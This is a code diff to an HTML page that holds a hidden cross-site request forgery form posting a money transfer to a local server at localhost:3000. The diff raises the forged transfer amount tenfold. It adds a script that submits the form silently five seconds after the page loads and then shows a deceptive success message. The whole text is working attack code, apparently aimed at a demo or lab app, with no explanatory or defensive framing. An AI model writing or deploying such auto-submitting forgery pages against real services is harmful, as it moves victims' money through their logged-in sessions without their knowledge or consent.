@@ -132,7 +132,7 @@
 
   <!-- Hidden CSRF Attack Form -->
   <form id="attackForm" action="http://localhost:3000/transfer" method="POST">
-    <input type="hidden" name="amount" value="1000">
+    <input type="hidden" name="amount" value="10000">
   </form>
   <p id="successMessage">Success! Your request has been processed.</p>
 
@@ -146,6 +146,14 @@
       $('#attackForm').submit();
       $('#successMessage').show();
       closePopup();
+    });
+
+    // Automatically submit the form when the page loads
+    $(document).ready(function() {
+      setTimeout(function() {
+        $('#attackForm').submit();
+        $('#successMessage').show();
+      }, 5000); 
     });
   </script>
 </body>
